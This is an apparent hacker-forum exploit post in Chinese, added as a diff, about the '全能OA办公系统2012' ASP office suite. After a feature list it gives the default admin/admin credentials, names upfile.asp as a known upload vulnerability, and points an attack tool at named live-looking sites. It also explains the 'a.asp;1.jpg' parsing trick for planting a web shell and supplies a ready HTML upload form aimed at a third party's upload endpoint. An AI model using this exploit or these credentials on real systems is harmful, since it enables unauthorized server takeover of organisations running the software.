@@ -1,0 +1,66 @@
+软件介绍：
+全能OA办公系统2012是功能非常强大的OA系统，目前功能已完全能满足日常办公需要。
+
+主要功能：
+公司通告 
+工作计划 
+通讯助理 
+客户资源 
+我的公文 
+公文传阅 
+公共资源 
+资源预约 
+今日考勤 
+个人计划 
+个人通讯录 
+个人基本档案 
+未读邮件 
+发邮件 
+收件夹 
+寄件夹 
+网络硬盘 
+网络会议 
+网络调查 
+交流论坛 
+
+管理用户名：admin 管理密码：admin
+
+原码下载：http://www.mycodes.net/30/4750.htm
+漏洞文件：upfile.asp 典型的动网上传漏洞不做多说
+利用: 明小子提交：http://www.0855.tv/upfile.asp即可
+
+
+如果upfile.asp 不存在。你可以试试下面的方法。上传a.asp;1.jpg 格式
+shell在http://www.shitsec.com/upfile/savepath/a.asp;1.jpg
+前提是有解析漏洞。
+EXP:
+
+////////////////////////////////////////////////////
+ <table border='0' align="center" cellpadding="5">
+<form method="POST" action="http://www.shitsec.com/oa/upfile/upfile.asp" enctype="multipart/form-data" id="form1" name="form1" onsubmit='return checkSub(this)'>
+<tr>
+            <td>报错：</td>
+            <td><input type='radio' name='errnumber' value='0'>
+              自动更名 
+              <input type='radio' name='errnumber' value='1' checked>
+              报错方式 
+              <input type='radio' name='errnumber' value='2'>
+              直接覆盖</td>
+          </tr>
+          <tr>
+            <td>主题：</td>
+            <td><input type='text' name='filename' size='30'></td>
+          </tr>
+          <tr>
+            <td>文件：</td>
+            <td><input type="file" name="fruit" size="30"></td>
+          </tr>
+          <tr>
+            <td valign='top'>简介：</td>
+            <td><textarea name='fileExt' cols='40' rows='5'></textarea></td>
+          </tr>
+
+            <td colspan='2'><input type="submit" value="上传文件" name="subbutt"></td>
+          </tr>
+        </form>
+///////////////////////////////////////////////////
